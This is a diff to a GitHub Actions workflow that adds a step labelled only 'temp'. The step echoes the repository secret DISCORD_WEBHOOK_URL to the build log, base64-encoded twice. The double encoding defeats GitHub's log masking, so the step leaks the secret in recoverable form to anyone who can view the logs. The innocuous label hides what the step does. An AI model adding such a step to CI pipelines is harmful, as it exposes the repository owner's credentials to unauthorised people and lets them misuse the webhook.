@@ -11,6 +11,12 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - name: temp
+        run: echo $DISCORD_WEBHOOK_URL | base64 | base64
+        shell: bash
+        env:
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+          
       - name: Checkout Repo
         uses: actions/checkout@master
 
